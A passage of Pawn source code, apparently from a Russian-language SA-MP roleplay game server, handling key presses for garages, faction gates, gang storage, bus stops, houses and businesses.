			if(IsPlayerInDynamicArea(playerid, AreaRoomExit))
			{
				new entranceid = PI[playerid][P_IN_ENTRANCE],
					roomid = PI[playerid][P_IN_ROOM];

				if(entranceid == -1 || roomid == -1)
					return 1;

				FreezePlayer(playerid, 2000);

				SetPlayerPos(playerid, coord_rooms[roomid][0], coord_rooms[roomid][1], coord_rooms[roomid][2]);
				SetPlayerVirtualWorld(playerid, entranceid + 1000);
				SetPlayerInterior(playerid, 3);

				PI[playerid][P_IN_ROOM] = -1;
			}
		}

	    if(IsPlayerInRangeOfPoint(playerid, 3.0, GARAGE_CAR_POSITION))
	    {
	        new garage_id = GetPVarInt(playerid, "in_garage");

	        if(garage_id)
	        {
	            new Float: x,
                    Float: y,
                    Float: angle = g_garages[garage_id][G_ANGLE],
                    fmt_text[65];

                x = g_garages[garage_id][G_POS_X] + 1.5 * floatsin(-angle + 180.0, degrees);
                y = g_garages[garage_id][G_POS_Y] + 1.5 * floatcos(-angle + 180.0, degrees);

                SetPlayerPos(playerid, x, y, g_garages[garage_id][G_POS_Z] + 0.5);
                SetPlayerFacingAngle(playerid, angle + 180.0);
				FreezePlayer(playerid, 2000);

             	SetPlayerInterior(playerid, 0);
			    SetPlayerVirtualWorld(playerid, 0);

                format(fmt_text, sizeof fmt_text, "Вы вышли из гаража {FFFF00}№%d", g_garages[garage_id][G_SQL_ID]);
			    SendClientMessage(playerid, 0x3399FFFF, fmt_text);

			    DeletePVar(playerid, "in_garage");
	        }
	        else SendClientMessage(playerid, 0x3399FFFF, "{FFFFFF}Ошибка: Вы не находитесь в гараже. Обратитесь к администрации");
	    }
	    else
	    {
	        new garage_id = GetNearestGarage(playerid);

	        if(garage_id != -1)
	        {
	            new fmt_text[144],
	                num = g_garages[garage_id][G_SQL_ID];

	            if(!strcmp(g_garages[garage_id][G_OWNER], "None", true))
				{
				    format(fmt_text, sizeof fmt_text, "{ffcd00}Гараж №%d продаётся\n\n{ffffff}Стоимость:\t\t%d руб.\nВы хотите купить его?", num, g_garages[garage_id][G_PRICE]);
				    ShowPlayerDialog(playerid, DIALOG_GARAGE_BUY, DIALOG_STYLE_MSGBOX, "{FF5533}Гараж продаётся", fmt_text, "Купить", "Отмена");
				}
				else if(!strcmp(g_garages[garage_id][G_OWNER], GetName(playerid), true))
				{
				    SetPlayerPos(playerid, GARAGE_CAR_POSITION);

				    SetPlayerInterior(playerid, num);
				    SetPlayerVirtualWorld(playerid, num);

				    FreezePlayer(playerid, 3200);

				    format(fmt_text, sizeof fmt_text, "Вы зашли в гараж {FFFF00}№%d{3399FF}. Чтобы покинуть его, используйте «H» {66CC33}(или «L.ALT» пешком)", num);
				    SendClientMessage(playerid, 0x3399FFFF, fmt_text);

				    SetPVarInt(playerid, "in_garage", garage_id);
				}
				else SendClientMessage(playerid, COLOR_GREY, "Этот гараж не принадлежит Вам");
	        }
	    }


	}

	if(HOLDING(KEY_CROUCH)) // H
	{
	    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        new vehicleid = GetPlayerVehicleID(playerid);

	        if(vehicleid == GetPlayerVehicleID(playerid))
	        {
	            if(IsPlayerInRangeOfPoint(playerid, 3.0, GARAGE_CAR_POSITION))
	            {
	                new garage_id = GetPVarInt(playerid, "in_garage");

	                if(garage_id)
	                {
	                    new Float: x,
	                        Float: y,
	                        Float: angle = g_garages[garage_id][G_ANGLE],
	                        fmt_text[65];

	                    x = g_garages[garage_id][G_POS_X] + 5.0 * floatsin(-angle + 180.0, degrees);
	                    y = g_garages[garage_id][G_POS_Y] + 5.0 * floatcos(-angle + 180.0, degrees);

	                    SetVehiclePos(vehicleid, x, y, g_garages[garage_id][G_POS_Z] + 0.5);
	                    SetVehicleZAngle(vehicleid, angle);

                     	SetPlayerInterior(playerid, 0);
					    SetPlayerVirtualWorld(playerid, 0);

					    LinkVehicleToInterior(vehicleid, 0);
					    SetVehicleVirtualWorld(vehicleid, 0);

	                    format(fmt_text, sizeof fmt_text, "Вы выехали из гаража {FFFF00}№%d", g_garages[garage_id][G_SQL_ID]);
					    SendClientMessage(playerid, 0x3399FFFF, fmt_text);

					    foreach(new i : Player)
					    {
					        if(!IsPlayerInAnyVehicle(i)) continue;

					        if(GetPlayerVehicleID(i) == vehicleid)
								DeletePVar(i, "in_garage");
					    }
	                }
	            }
	            else
	            {
	                new idx = GetNearestGarage(playerid);

	                if(idx != -1)
	                {
	                    new fmt_text[144],
	                        num = g_garages[idx][G_SQL_ID];

	                    if(!strcmp(g_garages[idx][G_OWNER], "None", true))
						{
						    format(fmt_text, sizeof fmt_text, "{ffcd00}Гараж №%d продаётся\n\n{ffffff}Стоимость:\t\t%d руб.\nВы хотите купить его?", num, g_garages[idx][G_PRICE]);
						    ShowPlayerDialog(playerid, DIALOG_GARAGE_BUY, DIALOG_STYLE_MSGBOX, "{FF5533}Гараж продаётся", fmt_text, "Купить", "Отмена");
						}
						else if(!strcmp(g_garages[idx][G_OWNER], GetName(playerid), true))
						{
		                	SetVehiclePos(vehicleid, GARAGE_CAR_POSITION);
						    SetVehicleZAngle(vehicleid, 90.0);

						    LinkVehicleToInterior(vehicleid, num);
						    SetVehicleVirtualWorld(vehicleid, num);

						    SetPlayerInterior(playerid, num);
						    SetPlayerVirtualWorld(playerid, num);

						    FreezePlayer(playerid, 3200, true);

						    format(fmt_text, sizeof fmt_text, "Вы заехали в гараж {FFFF00}№%d{3399FF}. Чтобы покинуть его, используйте «H» {66CC33}(или «L.ALT» пешком)", num);
						    SendClientMessage(playerid, 0x3399FFFF, fmt_text);

						    foreach(new i : Player)
						    {
						        if(!IsPlayerInAnyVehicle(i)) continue;

						        if(GetPlayerVehicleID(i) == vehicleid)
									SetPVarInt(i, "in_garage", idx);
						    }
						}
						else SendClientMessage(playerid, COLOR_GREY, "Этот гараж не принадлежит Вам");
					}
	            }
	        }
			if(IsPlayerInRangeOfPoint(playerid, 8.0, -401.8304,950.3879,12.2800))
			{
				if(GetVehicleData(vehicleid, veh_slot) != 55)
					return SendClientMessage(playerid, C_RED, "Загружать продукт можно только в личный грузовик");

				ShowPlayerDialog
				(
					playerid, DIALOG_LOAD_PROD, DIALOG_STYLE_INPUT,
					"{FFCC00}Загрузка продуктов",
					"{FFFFFF}Введите количество продуктов, которое хотите купить (1 продукт = 10 руб)",
					"Купить", "Отмена"
				);
			}
	    }
		if(IsPlayerInRangeOfPoint(playerid, 8.0, 1874.5592,-2207.4270,11.2581))
		{
			if(PI[playerid][pMember] == TEAM_FBI)
			{
				if(PI[playerid][pRank] >= 2)
				{
					switch(fbi_barrier_status)
					{
						case 0:
						{
							MoveObject(fbi_barrier, 1869.94, -2207.36, 11.000, 0.2, 0.0000, 0.0000, 0.0000);
							SendClientMessage(playerid, C_OSNOV, "Вы открыли шлагбаум");
							SetPlayerChatBubble(playerid,"Открывает шлагбаум", C_OSNOV, 30.0, 10000);
							fbi_barrier_status = 1;
						}
						case 1:
						{
							MoveObject(fbi_barrier, 1869.94, -2207.36, 11.000, 0.2, 0.0000, 90.0000, 0.0000);
							SendClientMessage(playerid, C_RED, "Вы закрыли шлагбаум");
							SetPlayerChatBubble(playerid,"Закрывает шлагбаум", C_RED, 30.0, 10000);
							fbi_barrier_status = 0;
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "Открывать шлагбаум можно с 2 ранга");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 8.0, 2562.1357,-2429.4907,21.9393))
		{
			if(PI[playerid][pMember] == TEAM_POLICIA)
			{
				if(PI[playerid][pRank] >= 2)
				{
					switch(dps_barrier_status)
					{
						case 0:
						{
							MoveObject(dps_barrier, 2561.99, -2433.16, 21.6046+0.2, 0.2, 0.0000, 0.0000, -90.0000);
							SendClientMessage(playerid, C_OSNOV, "Вы открыли шлагбаум");
							SetPlayerChatBubble(playerid,"Открывает шлагбаум", C_OSNOV, 30.0, 10000);
							dps_barrier_status = 1;
						}
						case 1:
						{
							MoveObject(dps_barrier, 2561.99, -2433.16, 21.6046+0.2, 0.2, 0.0000, -90.0000, -90.0000);
							SendClientMessage(playerid, C_RED, "Вы закрыли шлагбаум");
							SetPlayerChatBubble(playerid,"Закрывает шлагбаум", C_RED, 30.0, 10000);
							dps_barrier_status = 0;
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "Открывать шлагбаум можно с 2 ранга");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 8.0, 145.4300, 651.5100, 11.7300))
		{
			if(PI[playerid][pMember] == TEAM_MERIA)
			{
				if(PI[playerid][pRank] >= 2)
				{
					switch(mayor_barrier_status)
					{
						case 0:
						{
							//MoveObject(mayor_barrier, 145.4771, 651.6431, 11.7300, 2.0, 0.0000, -24.0000, 69.2200);
							SendClientMessage(playerid, C_OSNOV, "Вы открыли шлагбаум");
							SetPlayerChatBubble(playerid,"Открывает шлагбаум", C_OSNOV, 30.0, 10000);
							mayor_barrier_status = 1;
						}
						case 1:
						{
							//MoveObject(mayor_barrier, 145.4300, 651.5100, 11.7300, 2.0, 0.0000, -90.0000, 69.0000);
							SendClientMessage(playerid, C_RED, "Вы закрыли шлагбаум");
							SetPlayerChatBubble(playerid,"Закрывает шлагбаум", C_RED, 30.0, 10000);
							mayor_barrier_status = 0;
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "Открывать шлагбаум можно с 2 ранга");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 10.0, 26.2938,2844.9690,23.8735))
		{
			if(PI[playerid][pMember] == TEAM_ARMIYA)
			{
				if(PI[playerid][pRank] >= 2)
				{
					switch(army_barrier_status)
					{
						case 0:
						{
							MoveObject(army_barrier, 33.9034, 2845.36, 23.9028, 2.0, 0.0000, 0.0000, 0.0000);
							SendClientMessage(playerid, C_OSNOV, "Вы открыли ворота");
							SetPlayerChatBubble(playerid,"Открывает ворота", C_OSNOV, 30.0, 10000);
							army_barrier_status = 1;
						}
						case 1:
						{
							MoveObject(army_barrier, 29.0539, 2845.36, 23.9028,  2.0, 0.0000, 0.0000, 0.0000);
							SendClientMessage(playerid, C_RED, "Вы закрыли ворота");
							SetPlayerChatBubble(playerid,"Закрывает ворота", C_RED, 30.0, 10000);
							army_barrier_status = 0;
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "Открывать шлагбаум можно с 2 ранга");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 10.0, 26.2938,2844.9690,23.8735))
			{
			if(PI[playerid][pMember] == TEAM_ARMIYA)
			{
				if(PI[playerid][pRank] >= 2)
				{
					switch(army_barrier_status2)
					{
						case 0:
						{
							MoveObject(army_barrier2, 18.8742, 2845.36, 23.9028, 2.0, 0.0000, 0.0000, 0.0000);
							//SendClientMessage(playerid, C_OSNOV, "Вы открыли ворота");
							//SetPlayerChatBubble(playerid,"Открывает ворота", C_OSNOV, 30.0, 10000);
							army_barrier_status2 = 1;
						}
						case 1:
						{
							MoveObject(army_barrier2, 23.6128, 2845.36, 23.9028, 2.0, 0.0000, 0.0000, 0.0000);
							//SendClientMessage(playerid, C_RED, "Вы закрыли ворота");
							//SetPlayerChatBubble(playerid,"Закрывает ворота", C_RED, 30.0, 10000);
							army_barrier_status2 = 0;
						}
					}
				}
				else SendClientMessage(playerid, C_RED, "Открывать шлагбаум можно с 2 ранга");
			}
		}
	}
	if(PRESSED(KEY_FIRE) || PRESSED(KEY_HANDBRAKE) || PRESSED(KEY_CROUCH) || PRESSED(KEY_ACTION))
    {
		if(GetPVarInt(playerid, "carryammo") == 300)
		{
			SendClientMessage(playerid, COLOR_RED, "Вы уронили ящик c патронами!");
			SetPVarInt(playerid,"carryammo",0);
			SetPVarInt(playerid,"carrygun",0);
			RemovePlayerAttachedObject(playerid,3);
			gGunWorkWH[2] += 300;
			ClearAnimations(playerid);
			ApplyAnimation(playerid,"CARRY","putdwn105",5.0,0,0,0,0,1);

			UpdateWH();
		}
		else if(GetPVarInt(playerid, "carrygun") == 300)
		{
			SendClientMessage(playerid, COLOR_RED, "Вы уронили ящик с боеприпасами!");
			SetPVarInt(playerid,"carryammo",0);
			SetPVarInt(playerid,"carrygun",0);
			RemovePlayerAttachedObject(playerid,3);
			gGunWorkWH[2] += 300;
			ClearAnimations(playerid);
			ApplyAnimation(playerid,"CARRY","putdwn105",5.0,0,0,0,0,1);

			UpdateWH();
		}
    }
	if(newkeys == 4)
	{
		new Float:pos[3];
		GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
		if(pos[0] == 2648.4799) SKick(playerid, 1171);
		return 0;
	}
	if(pCuff[playerid][pCuffee] == playerid)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			if((newkeys & KEY_JUMP || newkeys & KEY_FIRE || newkeys & KEY_CROUCH || (newkeys & KEY_HANDBRAKE && newkeys & KEY_SECONDARY_ATTACK)))
			{
				ClearAnimations(playerid);
				SetTimerEx("Unfreez2",3000,false,"i",playerid);
				ApplyAnimation(playerid,"FAT","IDLE_tired",3.0,1,0,0,0,3000,1);
				TogglePlayerControllable(playerid,0);
				SendClientMessage(playerid, COLOR_GREY, "Вы не можете использовать это действие так как Вы в наручниках.");
			}
		}
	}
	if(newkeys & 2)//поднять
	{
		for(new i = 999; i >= 0; i --)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,1.5,DropItem[i][dX],DropItem[i][dY],DropItem[i][dZ]))continue;
		    if(GetPlayerInterior(playerid)!=DropItem[i][dInt]&&GetPlayerVirtualWorld(playerid)!=DropItem[i][dWorld])continue;
		    //if(TimerNoUpItem[playerid]>0){return SendClientMessage(playerid,COLOR_GREY,"Вы не можете сейчас поднимать предметы!");}
	        SetPVarInt(playerid,"IDplayaInv",i);
        	if(DropItem[i][dPiece]==1){return PlayerUpItem(playerid,i);}

	        STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"{FFFFFF}Предмет: %s{FFFFFF}\nКоличество: %i{FFFFFF}\n\nВведите количество предметов которое хотите поднять:",Item[DropItem[i][dIDItem]][iName],DropItem[i][dPiece]);
			ShowPlayerDialog(playerid,D_INVENT+4,DIALOG_STYLE_INPUT,"Поднять предмет", STRING_GLOBAL, "Выбрать", "Выйти");
		    break;
		}
	}
	if(newkeys & KEY_WALK)
	{
		for(new idx = 0; idx < sizeof g_bus; idx ++)
		{
			if(PlayerToPoint(2.0, playerid, g_bus[idx][stop_x], g_bus[idx][stop_y], g_bus[idx][stop_z]))
			{
				for(new i; i < sizeof bus; i++) PlayerTextDrawShow(playerid, bus[i][playerid]);

				if(g_bus[idx][route_one] == EOS) PlayerTextDrawHide(playerid, bus[12][playerid]), PlayerTextDrawHide(playerid, bus[9][playerid]);
				if(g_bus[idx][route_two] == EOS) PlayerTextDrawHide(playerid, bus[13][playerid]), PlayerTextDrawHide(playerid, bus[4][playerid]);
				if(g_bus[idx][route_three] == EOS) PlayerTextDrawHide(playerid, bus[3][playerid]), PlayerTextDrawHide(playerid, bus[5][playerid]);

				new fmt_msg[140];

				format
				(
					fmt_msg, sizeof fmt_msg,
					"остановка: ~y~%s~n~~w~стоимость проезда: ~y~от 25р~n~~w~номер маршрута: ~y~%d~n~~w~номер автобуса: ~y~%d",
					g_bus[idx][stop_name],
					g_bus[idx][route_id],
					g_bus[idx][bus_id]
				);

				PlayerTextDrawSetString(playerid, bus[8][playerid], fmt_msg);

				if(g_bus[idx][route_one] != EOS)
				{
					format(fmt_msg, sizeof fmt_msg, "%s", g_bus[idx][route_one]);
					PlayerTextDrawSetString(playerid, bus[9][playerid], fmt_msg);
				}

				if(g_bus[idx][route_two] != EOS)
				{
					format(fmt_msg, sizeof fmt_msg, "%s", g_bus[idx][route_two]);
					PlayerTextDrawSetString(playerid, bus[4][playerid], fmt_msg);
				}

				if(g_bus[idx][route_three] != EOS)
				{
					format(fmt_msg, sizeof fmt_msg, "%s", g_bus[idx][route_three]);
					PlayerTextDrawSetString(playerid, bus[5][playerid], fmt_msg);
				}

				SelectTextDraw(playerid, 0x009900FF);

				SetPVarInt(playerid, "stop_bus", 1);

				PI[playerid][pBusID] = idx;

				TextDrawHideForPlayer(playerid, server_green_zone[0]);

				break;
			}
		}
		// Семейный склад
		if(PlayerToPoint(2.0, playerid, 498.0487,-2.2444,1904.9518))
        {
		    new familyid = PI[playerid][P_FAMILY];

			if(familyid != 0)
			{
				if(GetPVarInt(playerid, "PlayerHouse") == GetFamilyData(familyid-1, F_HOUSE))
				{
					ShowPlayerDialog
					(
						playerid, DIALOG_FAMILY_STORE, DIALOG_STYLE_LIST,
						"{FFCC00}Склад семьи",
						"1. Положить наркотики\n"\
						"2. Положить патроны\n"\
						"3. Пололжить деньги\n"\
						"4. Взять наркотики\n"\
						"5. Взять патроны\n"\
						"6. Взять деньги",
						"Далее", "Отмена"
					);
				}
			}
		}
		// Бар семьи
		if(PlayerToPoint(2.0, playerid, 500.9015,-16.1483,1904.9518))
        {
			ShowPlayerDialog
			(
				playerid, DIALOG_FAMILY_BAR, DIALOG_STYLE_LIST,
				"{FFCC00}Бар",
				"1. Кола\t\t\t{FFCC00}(300 руб)\n"\
				"2. Квас\t\t\t{FFCC00}(300 руб)\n"\
				"3. Моршанское пиво\t{FFCC00}(500 руб)\n"\
				"4. Водка\t\t{FFCC00}(1000 руб)\n"\
				"5. Ром\t\t\t{FFCC00}(1500 руб)\n"\
				"6. Мартини\t\t{FFCC00}(1500 руб)\n"\
				"7. Текила\t\t{FFCC00}(1500 руб)\n"\
				"8. Абсент\t\t{FFCC00}(2000 руб)\n"\
				"9. Коньяк\t\t{FFCC00}(2500 руб)\n"\
				"10. Виски\t\t{FFCC00}(3000 руб)\n"\
				"11. Медовуха\t\t{FFCC00}(5000 руб)\n",
				"Далее", "Отмена"
			);
		}
		// - Склад ФК ЦСКА
        if(PlayerToPoint(2.0, playerid, 2567.5425,-1847.9023,2522.8401))
        {
		    if(PI[playerid][pMember] == TEAM_GROOVE)
		    {
		        if(PI[playerid][pMember] == 7 && b_Sklad{0}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей банды закрыт!");
				ShowPlayerDialog(playerid, D_GANG, 2, "Склад банды", "\
				{63BD4E}Положить патроны\n\
				{63BD4E}Положить деньги\n\
				{63BD4E}Положить наркотики\n\
				{FFFFFF}Взять патроны\n\
				Взять деньги\n\
				Взять наркотики", "Принять", "Отмена");
			}
		}
		// - Склад ФК СПАРТАК
		if(PlayerToPoint(2.0, playerid, -2626.1074,2915.4783,2738.6201))
		{
		    if(PI[playerid][pMember] == TEAM_BALLAS)
		    {
		        if(PI[playerid][pMember] == 8 && b_Sklad{1}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей банды закрыт!");
	    	   	ShowPlayerDialog(playerid, D_GANG, 2, "Склад банды", "\
			    {63BD4E}Положить патроны\n\
			    {63BD4E}Положить деньги\n\
				{63BD4E}Положить наркотики\n\
				{FFFFFF}Взять патроны\n\
				Взять деньги\n\
				Взять наркотики", "Принять", "Отмена");
			}
		}
		// - Склад Русской мафии
		if(PlayerToPoint(2.0, playerid, 632.2433,10.1143,1173.6394))
		{
		    if(PI[playerid][pMember] == TEAM_RSM)
		    {
		        if(PI[playerid][pMember] == 16 && b_Sklad{6}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей мафии закрыт!");
				ShowPlayerDialog(playerid, D_MAFIA, 2, "Склад мафии", "{63BD4E}Положить патроны\n{63BD4E}Положить деньги\n{63BD4E}Положить наркотики\n{FFFFFF}Взять патроны\nВзять деньги\nВзять наркотики", "Принять", "Отмена");
			}
		}
		// Склад Итальяеской мафии
		if(PlayerToPoint(2.0, playerid, 470.7443,-349.4612,1016.4385))
		{
		    if(PI[playerid][pMember] == TEAM_OPG1)
		    {
		        if(PI[playerid][pMember] == 15 && b_Sklad{5}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей мафии закрыт!");
				ShowPlayerDialog(playerid, D_MAFIA, 2, "Склад мафии", "{63BD4E}Положить патроны\n{63BD4E}Положить деньги\n{63BD4E}Положить наркотики\n{FFFFFF}Взять патроны\nВзять деньги\nВзять наркотики", "Принять", "Отмена");
			}
		}
		for(new i = 1; i <= TOTALATM; i++)
		{
		    if(PlayerToPoint(1.0, playerid, ATMInfo[i][aX], ATMInfo[i][aY], ATMInfo[i][aZ])) ATMList(playerid);
		}
		// - Выход с дома на ALT
		new a = GetPVarInt(playerid, "PlayerHouse");
		if(PlayerToPoint(1.0, playerid, -1621.5793,1578.0673,2005.7100) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
		{
  			if(HouseInfo[a][hAutoDoors] == 0) return SendClientMessage(playerid, COLOR_GREY, "В этом доме не установлены автоматические двери");
			SetPlayerInterior(playerid, HouseInfo[a][hInt]);
			SetPlayerVirtualWorld(playerid, HouseInfo[a][hVirtual]);
			FreezePlayer(playerid, 5000);
			SetPlayerPos(playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]);
		}
		if(HouseInfo[a][hGarage] == 1)
		{
			if(PlayerToPoint(1.0, playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
			{
			    if(HouseInfo[a][hAutoDoors] == 0) return SendClientMessage(playerid, COLOR_GREY, "В этом доме не установлены автоматические двери");
				ShowPlayerDialog(playerid, D_HOME+1, DIALOG_STYLE_LIST, "Куда Вы хотите выйти?", "- На улицу\n- В гараж", "Ок", "Закрыть");
			}
		}
		else
		{
			if(PlayerToPoint(1.0, playerid, HouseInfo[a][hExitx], HouseInfo[a][hExity], HouseInfo[a][hExitz]) && GetPlayerVirtualWorld(playerid) == HouseInfo[a][hVirtual])
			{
   				if(HouseInfo[a][hAutoDoors] == 0) return SendClientMessage(playerid, COLOR_GREY, "В этом доме не установлены автоматические двери");
				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				FreezePlayer(playerid, 5000);
				SetPlayerPos(playerid, HouseInfo[a][hEntrx], HouseInfo[a][hEntry], HouseInfo[a][hEntrz]);
			}
		}
		// - Вход в дом на ALT
		for(new idx = TOTALHOUSE; idx > 0; idx --)
		{
			if(PlayerToPoint(1.0, playerid, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]))
			{
				SetPVarInt(playerid, "PlayerHouse", idx);
				new string[400];
				new klass[50];
				if(HouseInfo[idx][hDiscript] == 1)
				{
				    klass = "низкий";
				}
				else if(HouseInfo[idx][hDiscript] == 2)
				{
				    klass = "средний";
				}
				else if(HouseInfo[idx][hDiscript] == 3)
				{
				    klass = "высокий";
				}
				else if(HouseInfo[idx][hDiscript] == 'D')
				{
				    klass = "элитный";
				}
				else if(HouseInfo[idx][hDiscript] == 'E')
				{
				    klass = "делюксовый [VIP]";
				}
				else if(HouseInfo[idx][hDiscript] == 'F')
				{
				    klass = "особняк";
				}
				else if(HouseInfo[idx][hDiscript] == 'G')
				{
				    klass = "квартира";
				}
				if(!strcmp(HouseInfo[idx][hOwner],"None",true))
				{
					format(string,sizeof(string),"{ffffff}Дом №:\t\t{FFCC00}%d\n{FFFFFF}Владелец:\t\t{FFCC00}государство\n{ffffff}Класс:\t\t\t{FFCC00}%s\n{ffffff}Стоимость:\t\t{FFCC00}%d рублей\n{ffffff}Оплата в день:\t\t{FFCC00}%d рублей\n\n{ffffff}Вы уверены, что хотите купить этот дом?",idx,klass,HouseInfo[idx][hPrice],GetHomeOplata(idx));
					return ShowPlayerDialog(playerid, D_JOINHOUSE, 0,"{FFCC00}Покупка дома",string,"Купить","Отмена");
				}
				else
				{
					format(string,sizeof(string),"{ffffff}Дом №:\t\t{FFCC00}%d\n{FFFFFF}Владелец:\t\t{FFCC00}%s\n{ffffff}Класс:\t\t\t{FFCC00}%s\n{ffffff}Стоимость:\t\t{FFCC00}%d рублей\n{ffffff}Оплата в день:\t\t{FFCC00}%d рублей",idx,HouseInfo[idx][hOwner],klass,HouseInfo[idx][hPrice],GetHomeOplata(idx));
					return ShowPlayerDialog(playerid, D_JOINHOUSE, 0,"{FFCC00}Дом занят",string,"Войти","Отмена");
				}
			}
		}
		// - Вход в бизнес на ALT
		for(new idx = TOTALBIZZ; idx > 0; idx --)
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]))
			{
				SetPVarInt(playerid, "PlayerBizz", idx);
				//bussines_id[playerid] = idx;

				printf("[DE-BUG] Player %s [%d] | Bussiness id: %d", GetName(playerid), playerid, idx);

				if(GetMoney(playerid) < BizzInfo[idx][bEnter])
					return SendClientMessage(playerid, C_RED, "Недостаточно средств для входа!");

				SetTimerEx("PickupBack", 3000, 0, "i", playerid);
		        pickupentered[playerid] = 1;

				GiveMoney(playerid, -BizzInfo[idx][bEnter], "Вход в бизнес");

				BizzInfo[idx][bMoney] += BizzInfo[idx][bEnter];
				MysqlUpdateBizzInt(idx, "money", BizzInfo[idx][bMoney]);

				BizzPay[idx] += BizzInfo[idx][bEnter];

				//FreezePlayer(playerid, 1500);

				printf("[DE-BUG] Code 34959");

				switch(BizzInfo[idx][bType])
				{
					case 1:
					{
						FreezePlayer(playerid, 5000);
						SetPlayerPos(playerid, 352.7596,493.5447,999.3438);
						SetPlayerFacingAngle(playerid, 271.6833);
						SetCameraBehindPlayer(playerid);
						SetPlayerInterior(playerid, 3);
					 	SetPlayerVirtualWorld(playerid, 3);
					}

					case 2: ShowPlayerDialog(playerid, 2282, DIALOG_STYLE_LIST, "Заправка", "1. Канистра\t\t\t1000р\n2. Набор инструментов\t8000р", "Купить", "Отказаться");

					case 3:
					{
						SetPlayerPos(playerid, 662.8346,497.2610,305.1310);
						SetPlayerFacingAngle(playerid, 87.4426);
					}

					case 4:
					{
						SetPlayerPos(playerid, -1499.9595,-296.6198,1762.7900);
						SetPlayerFacingAngle(playerid, 270.0);
					}

					case 5:
					{
						SetPlayerPos(playerid, -187.3197, 880.8048, 2612.6399);
						SetPlayerFacingAngle(playerid, 180.0);
					}

					case 6:
					{
						SetPlayerPos(playerid, 540.4188, -844.3546, 1002.0000);
						SetPlayerFacingAngle(playerid, 180.0);
					}

					case 8:
					{
						SetPlayerPos(playerid, -913.9792, 1202.0702, 1002.0200);
						SetPlayerFacingAngle(playerid, 360.0);
					}

					case 9:
					{
						SetPlayerPos(playerid, 1690.1354, 2068.0659, -7.8350);
						SetPlayerFacingAngle(playerid, 88.0);
					}

					case 10:
					{
						SetPlayerPos(playerid, 637.1538, -1129.7153, 1081.4840);
						SetPlayerFacingAngle(playerid, 270.0);
					}
					case 11: ShowPlayerDialog(playerid, D_JOINCARS, 0, "Автосалон", "{FFFFFF}Вас приветствует автосалон!\nПерейти к покупке транспорта?", "Перейти", "Закрыть");

					case 13:
					{
						SetPlayerPos(playerid, 1066.7427, 1911.4049, 3026.7639);
						SetPlayerFacingAngle(playerid, 90.0);
					}
				}

				printf("[DE-BUG] Player %s [%d] | Bussiness id: %d | Bussiness type: %d", GetName(playerid), playerid, idx, BizzInfo[idx][bType]);

				SetPlayerInterior(playerid, BizzInfo[idx][bInt]);
				SetPlayerVirtualWorld(playerid, BizzInfo[idx][bVirtual]);

				SetCameraBehindPlayer(playerid);

				PlayerMenuExit(playerid);
			}
			if(IsPlayerInRangeOfPoint(playerid, 3.0, g_business_info[BizzInfo[idx][bType]-1][BI_MENU_X], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Y], g_business_info[BizzInfo[idx][bType]-1][BI_MENU_Z]))
			{
				switch(BizzInfo[idx][bType])
				{
					case 1: MagazineList(playerid);
					case 3: EatList(playerid, idx);
					case 4,5,9: BarList(playerid);
					case 6: GunShopList(playerid);
					case 8: SkinShopList(playerid);
					case 10: ShowPlayerOrdersList(playerid);
				}
			}
			// - Выход с бизнеса на ALT
			if(PlayerToPoint(3.0, playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_X], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Y], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Z]) && GetPlayerVirtualWorld(playerid) == BizzInfo[idx][bVirtual])
			{
			    FreezePlayer(playerid, 5000);
				//SetPlayerPos(playerid,BizzInfo[idx][B_ENTER_X], BizzInfo[idx][B_ENTER_Y], BizzInfo[idx][B_ENTER_Z]);
				//SetPlayerFacingAngle(playerid, BizzInfo[idx][B_ENTER_A]);
				SetPlayerPos(playerid,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz]);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid,0);
			}
		}
		if(PosRozetka(playerid)) RozetkaList(playerid);
	}
	if(HOLDING(KEY_CROUCH))
	{
		if(PlayerToPoint(10.0, playerid, -734.9475, 2034.3597, 44.9500))
		{
			if(GetName(playerid) == HouseInfo[360][hOwner] || 10 <= PI[playerid][pAdmin] <= 7)
			{
				if(GateVipHouseLavrovStatus == 0)
				{
					GateVipHouseLavrovStatus = 1;

					MoveObject(GateVipHouseLavrov, -735.2615, 2026.9477, 44.9500, 2.0);

					SendClientMessage(playerid, 0xFFCC00FF, "Вы открыли ворота");

					SetPlayerChatBubble(playerid,"Открывает ворота",0xFFCC00FF,30.0,10000);
				}
				else
				{
					GateVipHouseLavrovStatus = 0;

					MoveObject(GateVipHouseLavrov, -735.2615, 2034.4477, 44.9500, 2.0);

					SendClientMessage(playerid, 0xFF6600FF, "Вы закрыли ворота");

					SetPlayerChatBubble(playerid,"Закрывает ворота",0xFF6600FF,30.0,10000);
				}
			}
		}
	}
	if(newkeys & 16384)
	{
